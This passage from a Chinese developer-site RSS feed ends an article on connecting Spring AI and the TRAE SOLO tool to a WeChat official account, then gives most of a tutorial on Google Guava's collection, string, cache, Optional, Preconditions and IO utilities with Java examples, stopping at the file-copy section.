<li>使用 <strong>表单组件</strong> 收集用户输入</li>
<li><strong>按钮事件绑定</strong> 后端接口 <code>/api/ai-suggest</code></li>
<li>接收模型返回后 <strong>自动填入右侧 JSON 区块</strong></li>
<li>“导入规则”按钮触发事件 -&gt; 调用 <code>/api/rules/import</code></li>
</ul>
<h5 data-id="heading-15">TRAE 配置亮点：</h5>
<ul>
<li>所有交互无须写前端代码，仅通过 <strong>事件配置 + 数据源绑定</strong> 完成</li>
<li>规则预览区使用 <strong>代码高亮组件</strong>，提升可读性</li>
<li>导入成功后自动通知用户并刷新流程图</li>
</ul>
<hr/>
<h4 data-id="heading-16">✅ 四、公众号接入：模型能力对外开放</h4>
<p>我们还将模型能力通过接口暴露给微信公众号，实现企业级对话式服务。</p>
<h5 data-id="heading-17">接入方案：</h5>
<ul>
<li>使用微信公众号开发者平台配置消息转发地址</li>
<li>后端接收用户文本消息，转发至 AI 接口</li>
<li>返回模型回答后回复文本消息</li>
</ul>
<pre><code class="hljs language-less" lang="less"><span class="hljs-variable">@PostMapping</span>(<span class="hljs-string">"/wx/msg"</span>)
public String <span class="hljs-built_in">handleMessage</span>(<span class="hljs-variable">@RequestBody</span> WxMessage message) {
    <span class="hljs-selector-tag">String</span> <span class="hljs-selector-tag">reply</span> = <span class="hljs-selector-tag">askQwen</span>(message.<span class="hljs-built_in">getContent</span>());
    <span class="hljs-selector-tag">return</span> <span class="hljs-selector-tag">buildWxTextResponse</span>(message, reply);
}
</code></pre>
<p><strong>实际用例：</strong><br/>
用户发送“请帮我写一个客户投诉分配规则”，公众号自动返回 JSON 格式建议，供运营参考。</p>
<hr/>
<h3 data-id="heading-18">🔁 总结：这次集成带给我的三点收获</h3>
<h4 data-id="heading-19">1. <strong>模型能力不再是“玩具”，开始成为业务加速器</strong></h4>
<p>它可以真正为我们节省配置时间、提供可参考的业务建议。</p>
<h4 data-id="heading-20">2. <strong>TRAE SOLO 让我把后端的能力延伸到了 UI 层</strong></h4>
<p>我能控制页面、配置流程、调用接口，<strong>不再依赖前端，也不担心交互落地不了。</strong></p>
<h4 data-id="heading-21">3. <strong>TARE 项目因为 AI + TRAE 的组合，焕发了第二春</strong></h4>
<p>原本只能内部使用的规则配置系统，现在具备了对外服务的能力。</p>
<hr/>
<h3 data-id="heading-22">📢 写在最后：全栈不是“全都会”，而是“全能交付”</h3>
<p>我仍然是一名 Java 工程师，但现在我能：</p>
<ul>
<li>接入大模型</li>
<li>搭建前端页面</li>
<li>构建业务流程</li>
<li>对接公众号服务</li>
</ul>
<p>这不是因为我变成了全栈，而是因为我有了好工具，比如 Spring AI 和 TRAE SOLO。</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[Guava 常用工具包完全指南]]></title>    <link>https://juejin.cn/post/7575112613779046434</link>    <guid>https://juejin.cn/post/7575112613779046434</guid>    <pubDate>2025-11-24T01:39:50.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7575112613779046434" data-draft-id="7575533124877582363" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content=" Guava 常用工具包完全指南"/> <meta itemprop="keywords" content="后端,Java"/> <meta itemprop="datePublished" content="2025-11-24T01:39:50.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="sino爱学习"/> <meta itemprop="url" content="https://juejin.cn/user/1873223544473431"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
             Guava 常用工具包完全指南
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/1873223544473431/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    sino爱学习
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-11-24T01:39:50.000Z" title="Mon Nov 24 2025 01:39:50 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-11-24
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    4
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读5分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">简介</h2>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/593643ad991e40af9dd060ca64ebf2cf~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgc2lub-eIseWtpuS5oA==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764554040&amp;x-signature=aVm6ZvOQJVBAWs5YibLQAg0QOYk%3D" alt="1763948312527.png" loading="lazy"/></p>
<p>Guava 是 Google 开源的 Java 核心库，提供了丰富的工具类和集合框架，能够极大提升开发效率。本文将介绍 Guava 中最常用的工具包及其实际应用。</p>
<h2 data-id="heading-1">1. 集合工具 (Collections)</h2>
<h3 data-id="heading-2">1.1 不可变集合</h3>
<p>不可变集合线程安全且不可修改，适合作为常量使用。</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// 创建不可变 List</span>
ImmutableList&lt;String&gt; list = ImmutableList.of(<span class="hljs-string">"A"</span>, <span class="hljs-string">"B"</span>, <span class="hljs-string">"C"</span>);

<span class="hljs-comment">// 创建不可变 Set</span>
ImmutableSet&lt;Integer&gt; set = ImmutableSet.of(<span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>, <span class="hljs-number">4</span>, <span class="hljs-number">5</span>);

<span class="hljs-comment">// 创建不可变 Map</span>
ImmutableMap&lt;String, Integer&gt; map = ImmutableMap.of(
    <span class="hljs-string">"Java"</span>, <span class="hljs-number">1</span>,
    <span class="hljs-string">"Python"</span>, <span class="hljs-number">2</span>,
    <span class="hljs-string">"Go"</span>, <span class="hljs-number">3</span>
);

<span class="hljs-comment">// 使用 Builder 构建复杂集合</span>
ImmutableList&lt;String&gt; complexList = ImmutableList.&lt;String&gt;builder()
    .add(<span class="hljs-string">"A"</span>)
    .add(<span class="hljs-string">"B"</span>, <span class="hljs-string">"C"</span>)
    .addAll(Arrays.asList(<span class="hljs-string">"D"</span>, <span class="hljs-string">"E"</span>))
    .build();
</code></pre>
<h3 data-id="heading-3">1.2 Multiset - 计数集合</h3>
<p>Multiset 允许元素重复，并可以统计元素出现次数。</p>
<pre><code class="hljs language-java" lang="java">Multiset&lt;String&gt; multiset = HashMultiset.create();
multiset.add(<span class="hljs-string">"apple"</span>);
multiset.add(<span class="hljs-string">"apple"</span>);
multiset.add(<span class="hljs-string">"banana"</span>);
multiset.add(<span class="hljs-string">"apple"</span>);

System.out.println(multiset.count(<span class="hljs-string">"apple"</span>));  <span class="hljs-comment">// 输出: 3</span>
System.out.println(multiset.size());          <span class="hljs-comment">// 输出: 4</span>

<span class="hljs-comment">// 遍历不重复元素</span>
<span class="hljs-keyword">for</span> (String element : multiset.elementSet()) {
    System.out.println(element + <span class="hljs-string">": "</span> + multiset.count(element));
}
</code></pre>
<h3 data-id="heading-4">1.3 Multimap - 一键多值映射</h3>
<p>Multimap 允许一个键对应多个值。</p>
<pre><code class="hljs language-java" lang="java">Multimap&lt;String, String&gt; multimap = ArrayListMultimap.create();
multimap.put(<span class="hljs-string">"Fruit"</span>, <span class="hljs-string">"Apple"</span>);
multimap.put(<span class="hljs-string">"Fruit"</span>, <span class="hljs-string">"Banana"</span>);
multimap.put(<span class="hljs-string">"Vegetable"</span>, <span class="hljs-string">"Carrot"</span>);

System.out.println(multimap.get(<span class="hljs-string">"Fruit"</span>));  <span class="hljs-comment">// 输出: [Apple, Banana]</span>

<span class="hljs-comment">// 转换为普通 Map</span>
Map&lt;String, Collection&lt;String&gt;&gt; map = multimap.asMap();
</code></pre>
<h3 data-id="heading-5">1.4 BiMap - 双向映射</h3>
<p>BiMap 提供键值互查的双向映射。</p>
<pre><code class="hljs language-java" lang="java">BiMap&lt;String, Integer&gt; biMap = HashBiMap.create();
biMap.put(<span class="hljs-string">"Alice"</span>, <span class="hljs-number">1</span>);
biMap.put(<span class="hljs-string">"Bob"</span>, <span class="hljs-number">2</span>);

<span class="hljs-comment">// 正向查询</span>
System.out.println(biMap.get(<span class="hljs-string">"Alice"</span>));  <span class="hljs-comment">// 输出: 1</span>

<span class="hljs-comment">// 反向查询</span>
System.out.println(biMap.inverse().get(<span class="hljs-number">1</span>));  <span class="hljs-comment">// 输出: Alice</span>
</code></pre>
<h3 data-id="heading-6">1.5 Table - 双键映射</h3>
<p>Table 提供行列式的双键映射结构。</p>
<pre><code class="hljs language-java" lang="java">Table&lt;String, String, Integer&gt; table = HashBasedTable.create();
table.put(<span class="hljs-string">"2023"</span>, <span class="hljs-string">"Q1"</span>, <span class="hljs-number">100</span>);
table.put(<span class="hljs-string">"2023"</span>, <span class="hljs-string">"Q2"</span>, <span class="hljs-number">150</span>);
table.put(<span class="hljs-string">"2024"</span>, <span class="hljs-string">"Q1"</span>, <span class="hljs-number">120</span>);

<span class="hljs-comment">// 获取值</span>
<span class="hljs-type">Integer</span> <span class="hljs-variable">value</span> <span class="hljs-operator">=</span> table.get(<span class="hljs-string">"2023"</span>, <span class="hljs-string">"Q1"</span>);  <span class="hljs-comment">// 100</span>

<span class="hljs-comment">// 获取某一行的所有数据</span>
Map&lt;String, Integer&gt; row = table.row(<span class="hljs-string">"2023"</span>);  <span class="hljs-comment">// {Q1=100, Q2=150}</span>

<span class="hljs-comment">// 获取某一列的所有数据</span>
Map&lt;String, Integer&gt; column = table.column(<span class="hljs-string">"Q1"</span>);  <span class="hljs-comment">// {2023=100, 2024=120}</span>
</code></pre>
<h2 data-id="heading-7">2. 字符串工具 (Strings)</h2>
<h3 data-id="heading-8">2.1 Joiner - 连接器</h3>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// 基本连接</span>
<span class="hljs-type">String</span> <span class="hljs-variable">result</span> <span class="hljs-operator">=</span> Joiner.on(<span class="hljs-string">", "</span>).join(Arrays.asList(<span class="hljs-string">"A"</span>, <span class="hljs-string">"B"</span>, <span class="hljs-string">"C"</span>));
<span class="hljs-comment">// 输出: A, B, C</span>

<span class="hljs-comment">// 跳过 null 值</span>
<span class="hljs-type">String</span> <span class="hljs-variable">withoutNull</span> <span class="hljs-operator">=</span> Joiner.on(<span class="hljs-string">", "</span>)
    .skipNulls()
    .join(<span class="hljs-string">"A"</span>, <span class="hljs-literal">null</span>, <span class="hljs-string">"B"</span>, <span class="hljs-string">"C"</span>);
<span class="hljs-comment">// 输出: A, B, C</span>

<span class="hljs-comment">// 替换 null 值</span>
<span class="hljs-type">String</span> <span class="hljs-variable">replaceNull</span> <span class="hljs-operator">=</span> Joiner.on(<span class="hljs-string">", "</span>)
    .useForNull(<span class="hljs-string">"N/A"</span>)
    .join(<span class="hljs-string">"A"</span>, <span class="hljs-literal">null</span>, <span class="hljs-string">"B"</span>);
<span class="hljs-comment">// 输出: A, N/A, B</span>

<span class="hljs-comment">// Map 连接</span>
Map&lt;String, String&gt; map = ImmutableMap.of(<span class="hljs-string">"name"</span>, <span class="hljs-string">"John"</span>, <span class="hljs-string">"age"</span>, <span class="hljs-string">"30"</span>);
<span class="hljs-type">String</span> <span class="hljs-variable">mapStr</span> <span class="hljs-operator">=</span> Joiner.on(<span class="hljs-string">"&amp;"</span>).withKeyValueSeparator(<span class="hljs-string">"="</span>).join(map);
<span class="hljs-comment">// 输出: name=John&amp;age=30</span>
</code></pre>
<h3 data-id="heading-9">2.2 Splitter - 分割器</h3>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// 基本分割</span>
Iterable&lt;String&gt; parts = Splitter.on(<span class="hljs-string">','</span>).split(<span class="hljs-string">"A,B,C"</span>);

<span class="hljs-comment">// 去除空白字符</span>
Iterable&lt;String&gt; trimmed = Splitter.on(<span class="hljs-string">','</span>)
    .trimResults()
    .split(<span class="hljs-string">" A , B , C "</span>);

<span class="hljs-comment">// 忽略空字符串</span>
Iterable&lt;String&gt; noEmpty = Splitter.on(<span class="hljs-string">','</span>)
    .omitEmptyStrings()
    .split(<span class="hljs-string">"A,,B,C"</span>);

<span class="hljs-comment">// 限制分割数量</span>
Iterable&lt;String&gt; limited = Splitter.on(<span class="hljs-string">','</span>)
    .limit(<span class="hljs-number">2</span>)
    .split(<span class="hljs-string">"A,B,C,D"</span>);
<span class="hljs-comment">// 结果: [A, B,C,D]</span>

<span class="hljs-comment">// 分割 Map</span>
Map&lt;String, String&gt; kvMap = Splitter.on(<span class="hljs-string">'&amp;'</span>)
    .withKeyValueSeparator(<span class="hljs-string">'='</span>)
    .split(<span class="hljs-string">"name=John&amp;age=30"</span>);
</code></pre>
<h3 data-id="heading-10">2.3 Strings 工具类</h3>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// null 转空字符串</span>
<span class="hljs-type">String</span> <span class="hljs-variable">str</span> <span class="hljs-operator">=</span> Strings.nullToEmpty(<span class="hljs-literal">null</span>);  <span class="hljs-comment">// ""</span>

<span class="hljs-comment">// 空字符串转 null</span>
<span class="hljs-type">String</span> <span class="hljs-variable">nullStr</span> <span class="hljs-operator">=</span> Strings.emptyToNull(<span class="hljs-string">""</span>);  <span class="hljs-comment">// null</span>

<span class="hljs-comment">// 字符串填充</span>
<span class="hljs-type">String</span> <span class="hljs-variable">padded</span> <span class="hljs-operator">=</span> Strings.padStart(<span class="hljs-string">"7"</span>, <span class="hljs-number">3</span>, <span class="hljs-string">'0'</span>);  <span class="hljs-comment">// "007"</span>
<span class="hljs-type">String</span> <span class="hljs-variable">paddedEnd</span> <span class="hljs-operator">=</span> Strings.padEnd(<span class="hljs-string">"7"</span>, <span class="hljs-number">3</span>, <span class="hljs-string">'0'</span>); <span class="hljs-comment">// "700"</span>

<span class="hljs-comment">// 重复字符串</span>
<span class="hljs-type">String</span> <span class="hljs-variable">repeated</span> <span class="hljs-operator">=</span> Strings.repeat(<span class="hljs-string">"ab"</span>, <span class="hljs-number">3</span>);  <span class="hljs-comment">// "ababab"</span>

<span class="hljs-comment">// 公共前缀</span>
<span class="hljs-type">String</span> <span class="hljs-variable">prefix</span> <span class="hljs-operator">=</span> Strings.commonPrefix(<span class="hljs-string">"testing"</span>, <span class="hljs-string">"test"</span>);  <span class="hljs-comment">// "test"</span>

<span class="hljs-comment">// 公共后缀</span>
<span class="hljs-type">String</span> <span class="hljs-variable">suffix</span> <span class="hljs-operator">=</span> Strings.commonSuffix(<span class="hljs-string">"testing"</span>, <span class="hljs-string">"interesting"</span>);  <span class="hljs-comment">// "ting"</span>
</code></pre>
<h2 data-id="heading-11">3. 缓存工具 (Cache)</h2>
<p>Guava Cache 提供本地缓存功能，支持多种过期策略。</p>
<pre><code class="hljs language-java" lang="java">LoadingCache&lt;String, String&gt; cache = CacheBuilder.newBuilder()
    .maximumSize(<span class="hljs-number">1000</span>)                          <span class="hljs-comment">// 最大容量</span>
    .expireAfterWrite(<span class="hljs-number">10</span>, TimeUnit.MINUTES)    <span class="hljs-comment">// 写入后过期</span>
    .expireAfterAccess(<span class="hljs-number">5</span>, TimeUnit.MINUTES)    <span class="hljs-comment">// 访问后过期</span>
    .recordStats()                              <span class="hljs-comment">// 启用统计</span>
    .build(<span class="hljs-keyword">new</span> <span class="hljs-title class_">CacheLoader</span>&lt;String, String&gt;() {
        <span class="hljs-meta">@Override</span>
        <span class="hljs-keyword">public</span> String <span class="hljs-title function_">load</span><span class="hljs-params">(String key)</span> <span class="hljs-keyword">throws</span> Exception {
            <span class="hljs-keyword">return</span> loadFromDatabase(key);  <span class="hljs-comment">// 缓存加载逻辑</span>
        }
    });

<span class="hljs-comment">// 使用缓存</span>
<span class="hljs-keyword">try</span> {
    <span class="hljs-type">String</span> <span class="hljs-variable">value</span> <span class="hljs-operator">=</span> cache.get(<span class="hljs-string">"key"</span>);
} <span class="hljs-keyword">catch</span> (ExecutionException e) {
    e.printStackTrace();
}

<span class="hljs-comment">// 手动放入</span>
cache.put(<span class="hljs-string">"key"</span>, <span class="hljs-string">"value"</span>);

<span class="hljs-comment">// 失效缓存</span>
cache.invalidate(<span class="hljs-string">"key"</span>);

<span class="hljs-comment">// 查看统计</span>
<span class="hljs-type">CacheStats</span> <span class="hljs-variable">stats</span> <span class="hljs-operator">=</span> cache.stats();
System.out.println(<span class="hljs-string">"命中率: "</span> + stats.hitRate());
</code></pre>
<h2 data-id="heading-12">4. 集合工具类 (Lists, Sets, Maps)</h2>
<h3 data-id="heading-13">4.1 Lists 工具</h3>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// 创建 ArrayList</span>
List&lt;String&gt; list = Lists.newArrayList(<span class="hljs-string">"A"</span>, <span class="hljs-string">"B"</span>, <span class="hljs-string">"C"</span>);

<span class="hljs-comment">// 指定容量</span>
List&lt;String&gt; capacityList = Lists.newArrayListWithCapacity(<span class="hljs-number">100</span>);

<span class="hljs-comment">// 反转列表</span>
List&lt;String&gt; reversed = Lists.reverse(list);

<span class="hljs-comment">// 分区</span>
List&lt;List&lt;String&gt;&gt; partitions = Lists.partition(list, <span class="hljs-number">2</span>);
<span class="hljs-comment">// 结果: [[A, B], [C]]</span>

<span class="hljs-comment">// 笛卡尔积</span>
List&lt;List&lt;String&gt;&gt; cartesian = Lists.cartesianProduct(
    Lists.newArrayList(<span class="hljs-string">"A"</span>, <span class="hljs-string">"B"</span>),
    Lists.newArrayList(<span class="hljs-string">"1"</span>, <span class="hljs-string">"2"</span>)
);
<span class="hljs-comment">// 结果: [[A, 1], [A, 2], [B, 1], [B, 2]]</span>
</code></pre>
<h3 data-id="heading-14">4.2 Sets 工具</h3>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// 创建 HashSet</span>
Set&lt;String&gt; set1 = Sets.newHashSet(<span class="hljs-string">"A"</span>, <span class="hljs-string">"B"</span>, <span class="hljs-string">"C"</span>);
Set&lt;String&gt; set2 = Sets.newHashSet(<span class="hljs-string">"B"</span>, <span class="hljs-string">"C"</span>, <span class="hljs-string">"D"</span>);

<span class="hljs-comment">// 并集</span>
Set&lt;String&gt; union = Sets.union(set1, set2);  <span class="hljs-comment">// [A, B, C, D]</span>

<span class="hljs-comment">// 交集</span>
Set&lt;String&gt; intersection = Sets.intersection(set1, set2);  <span class="hljs-comment">// [B, C]</span>

<span class="hljs-comment">// 差集</span>
Set&lt;String&gt; difference = Sets.difference(set1, set2);  <span class="hljs-comment">// [A]</span>

<span class="hljs-comment">// 对称差集</span>
Set&lt;String&gt; symmetricDifference = Sets.symmetricDifference(set1, set2);  <span class="hljs-comment">// [A, D]</span>

<span class="hljs-comment">// 幂集</span>
Set&lt;Set&lt;String&gt;&gt; powerSet = Sets.powerSet(Sets.newHashSet(<span class="hljs-string">"A"</span>, <span class="hljs-string">"B"</span>));
<span class="hljs-comment">// 结果: [[], [A], [B], [A, B]]</span>
</code></pre>
<h3 data-id="heading-15">4.3 Maps 工具</h3>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// 创建 HashMap</span>
Map&lt;String, Integer&gt; map = Maps.newHashMap();

<span class="hljs-comment">// 从 Set 创建 Map</span>
Set&lt;String&gt; keys = Sets.newHashSet(<span class="hljs-string">"A"</span>, <span class="hljs-string">"B"</span>, <span class="hljs-string">"C"</span>);
Map&lt;String, String&gt; mapFromKeys = Maps.asMap(keys, key -&gt; key.toLowerCase());

<span class="hljs-comment">// 过滤 Map</span>
Map&lt;String, Integer&gt; filtered = Maps.filterKeys(map, key -&gt; key.startsWith(<span class="hljs-string">"A"</span>));

<span class="hljs-comment">// 转换 Map 值</span>
Map&lt;String, String&gt; transformed = Maps.transformValues(map, value -&gt; <span class="hljs-string">"Value: "</span> + value);

<span class="hljs-comment">// 差异比较</span>
MapDifference&lt;String, Integer&gt; diff = Maps.difference(map1, map2);
System.out.println(<span class="hljs-string">"仅在左侧: "</span> + diff.entriesOnlyOnLeft());
System.out.println(<span class="hljs-string">"仅在右侧: "</span> + diff.entriesOnlyOnRight());
System.out.println(<span class="hljs-string">"值不同: "</span> + diff.entriesDiffering());
</code></pre>
<h2 data-id="heading-16">5. Optional - 避免空指针</h2>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// 创建 Optional</span>
Optional&lt;String&gt; optional = Optional.of(<span class="hljs-string">"Hello"</span>);
Optional&lt;String&gt; nullable = Optional.fromNullable(<span class="hljs-literal">null</span>);
Optional&lt;String&gt; absent = Optional.absent();

<span class="hljs-comment">// 判断是否存在</span>
<span class="hljs-keyword">if</span> (optional.isPresent()) {
    System.out.println(optional.get());
}

<span class="hljs-comment">// 提供默认值</span>
<span class="hljs-type">String</span> <span class="hljs-variable">value</span> <span class="hljs-operator">=</span> nullable.or(<span class="hljs-string">"Default"</span>);

<span class="hljs-comment">// 转换</span>
Optional&lt;Integer&gt; length = optional.transform(String::length);

<span class="hljs-comment">// 与 Java 8 Optional 互转</span>
java.util.Optional&lt;String&gt; javaOptional = optional.toJavaUtil();
Optional&lt;String&gt; guavaOptional = Optional.fromJavaUtil(javaOptional);
</code></pre>
<h2 data-id="heading-17">6. Preconditions - 前置条件检查</h2>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">processUser</span><span class="hljs-params">(String name, <span class="hljs-type">int</span> age, List&lt;String&gt; roles)</span> {
    <span class="hljs-comment">// 检查非 null</span>
    Preconditions.checkNotNull(name, <span class="hljs-string">"姓名不能为空"</span>);
    
    <span class="hljs-comment">// 检查参数条件</span>
    Preconditions.checkArgument(age &gt;= <span class="hljs-number">0</span> &amp;&amp; age &lt;= <span class="hljs-number">150</span>, 
        <span class="hljs-string">"年龄必须在 0-150 之间，实际值: %s"</span>, age);
    
    <span class="hljs-comment">// 检查状态</span>
    Preconditions.checkState(isInitialized, <span class="hljs-string">"服务未初始化"</span>);
    
    <span class="hljs-comment">// 检查索引</span>
    Preconditions.checkElementIndex(<span class="hljs-number">0</span>, roles.size(), <span class="hljs-string">"角色列表"</span>);
    
    <span class="hljs-comment">// 检查位置索引</span>
    Preconditions.checkPositionIndex(<span class="hljs-number">1</span>, roles.size(), <span class="hljs-string">"角色列表"</span>);
}
</code></pre>
<h2 data-id="heading-18">7. Objects 工具</h2>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// 空值判断</span>
<span class="hljs-type">boolean</span> <span class="hljs-variable">isNull</span> <span class="hljs-operator">=</span> Objects.equal(<span class="hljs-literal">null</span>, <span class="hljs-literal">null</span>);  <span class="hljs-comment">// true</span>

<span class="hljs-comment">// 哈希码</span>
<span class="hljs-type">int</span> <span class="hljs-variable">hash</span> <span class="hljs-operator">=</span> Objects.hashCode(obj1, obj2, obj3);

<span class="hljs-comment">// toString 辅助</span>
<span class="hljs-type">String</span> <span class="hljs-variable">str</span> <span class="hljs-operator">=</span> MoreObjects.toStringHelper(<span class="hljs-built_in">this</span>)
    .add(<span class="hljs-string">"name"</span>, name)
    .add(<span class="hljs-string">"age"</span>, age)
    .toString();
<span class="hljs-comment">// 输出: ClassName{name=John, age=30}</span>

<span class="hljs-comment">// 比较链</span>
<span class="hljs-type">int</span> <span class="hljs-variable">result</span> <span class="hljs-operator">=</span> ComparisonChain.start()
    .compare(<span class="hljs-built_in">this</span>.name, other.name)
    .compare(<span class="hljs-built_in">this</span>.age, other.age)
    .result();
</code></pre>
<h2 data-id="heading-19">8. IO 工具</h2>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// 读取文件</span>
<span class="hljs-type">String</span> <span class="hljs-variable">content</span> <span class="hljs-operator">=</span> Files.asCharSource(<span class="hljs-keyword">new</span> <span class="hljs-title class_">File</span>(<span class="hljs-string">"test.txt"</span>), Charsets.UTF_8).read();

<span class="hljs-comment">// 写入文件</span>
Files.asCharSink(<span class="hljs-keyword">new</span> <span class="hljs-title class_">File</span>(<span class="hljs-string">"output.txt"</span>), Charsets.UTF_8).write(<span class="hljs-string">"Hello World"</span>);

<span class="hljs-comment">// 复制文件</span>
